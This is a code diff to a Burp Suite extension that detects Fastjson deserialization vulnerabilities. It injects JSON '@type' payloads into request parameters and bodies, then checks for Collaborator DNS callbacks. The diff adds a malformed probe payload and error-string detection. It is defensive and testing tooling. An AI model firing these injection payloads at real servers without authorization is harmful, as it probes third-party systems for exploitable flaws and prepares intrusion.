@@ -14,7 +14,7 @@ from javax.swing import JTable;
 from javax.swing import SwingUtilities;
 from javax.swing.table import AbstractTableModel;
 from threading import Lock
-import json,string
+import json,string,base64
 import time,random
 
 class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController, AbstractTableModel):
@@ -54,6 +54,7 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
         tabs.addTab("Response", self._responseViewer.getComponent())
         self._splitpane.setRightComponent(tabs)
         self.payloads = [
+            '''{"rand":{"@type":"hello","val":"''',
             """{"rand":{"@type":"java.net.InetAddress","val":"dnslog"}}""",
             """{"rand":{"@type":"java.net.Inet4Address","val":"dnslog"}}""",
             """{"rand":{"@type":"java.net.Inet6Address","val":"dnslog"}}""",
@@ -115,6 +116,7 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
     def scancheck(self,baseRequestResponse,payload):
         collaboratorContext = self._callbacks.createBurpCollaboratorClientContext()
         val = collaboratorContext.generatePayload(True)
+
         payload = payload.replace('dnslog',val)
         fastjson_poc = payload.replace('rand',self.rand_str(6))
         host, port, protocol, method, headers, params, url, reqBodys, analyze_request = self.Get_RequestInfo(baseRequestResponse)
@@ -154,11 +156,19 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
                     is_https = False
                 againRes = self._callbacks.makeHttpRequest(host, port, is_https, againReq)
                 analyze_againRes = self._helpers.analyzeResponse(againRes)
+                analyzedreq = self._helpers.analyzeRequest(againRes)
+                content = againRes[analyzedreq.getBodyOffset():].tostring()
                 time.sleep(10)
                 if collaboratorContext.fetchCollaboratorInteractionsFor(val):
                     print("change params success")
                     print(info)
                     return info,analyze_againRes,','.join(json_list),str(url)
+                elif 'alibaba' in content or 'fastjson' in content or 'JSONException' in content:
+                    print("change params error")
+                    print(info)
+                    return info,analyze_againRes,','.join(json_list),str(url)
+
+
             else:
                 info = ""
                 againReq_headers = headers
@@ -173,11 +183,25 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
                     is_https = False
                 againRes = self._callbacks.makeHttpRequest(host, port, is_https, againReq)
                 analyze_againRes = self._helpers.analyzeResponse(againRes)
+                # resp header
+                #rep_headers = analyze_againRes.getHeaders()
+                # req body
+                #rep_bodys = againRes[analyze_againRes.getBodyOffset():].tostring()
+                analyzedreq = self._helpers.analyzeRequest(againRes)
+                # req header
+                #print(analyzedreq.getHeaders())
+                # resp body
+                content = againRes[analyzedreq.getBodyOffset():].tostring()
                 if collaboratorContext.fetchCollaboratorInteractionsFor(val):
                     info = info +'\n' + fastjson_poc
                     print("change method success")
                     print(info)
-                    return info,analyze_againRes,'againReq', str(url)
+                    return info,analyzedreq,'againReq', str(url)
+                elif 'alibaba' in content or 'fastjson' in content or 'JSONException' in content:
+                    info = info +'\n' + fastjson_poc
+                    print("change method error")
+                    print(info)
+                    return info,analyzedreq,'req Error', str(url)
 
         elif method == "POST":
             json_list = []
@@ -200,12 +224,20 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
                     is_https = False
                 againRes = self._callbacks.makeHttpRequest(host, port, is_https, againReq)
                 analyze_againRes = self._helpers.analyzeResponse(againRes)
+                analyzedreq = self._helpers.analyzeRequest(againRes)
+                content = againRes[analyzedreq.getBodyOffset():].tostring()
                 time.sleep(10)
                 if collaboratorContext.fetchCollaboratorInteractionsFor(val):
                     info = info +'\n' + replace_reqBodys
                     print("change postdata success")
                     print(info)
                     return info,analyze_againRes,'postdata', str(url)
+                elif 'alibaba' in content or 'fastjson' in content or 'JSONException' in content:
+                    info = info +'\n' + replace_reqBodys
+                    print("change postdata error")
+                    print(info)
+                    return info,analyze_againRes,'postdata error', str(url)
+
             else: # check reqbody like a=1&b=json_str
                 replace_params = ''
                 is_json_post = False
@@ -238,12 +270,21 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
                     # print(replace_params)
                     againRes = self._callbacks.makeHttpRequest(host, port, is_https, againReq)
                     analyze_againRes = self._helpers.analyzeResponse(againRes)
+                    analyzedreq = self._helpers.analyzeRequest(againRes)
+                    content = againRes[analyzedreq.getBodyOffset():].tostring()
+
                     time.sleep(10)
                     if collaboratorContext.fetchCollaboratorInteractionsFor(val):
                         info = info +'\n' + replace_params
                         print("change postdata params success")
                         print(info)
                         return info,analyze_againRes,','.join(json_list), str(url)
+                    elif 'alibaba' in content or 'fastjson' in content or 'JSONException' in content:
+                        info = info +'\n' + replace_params
+                        print("change postdata params error")
+                        print(info)
+                        return info,analyze_againRes,','.join(json_list), str(url)
+
         return []
 
 
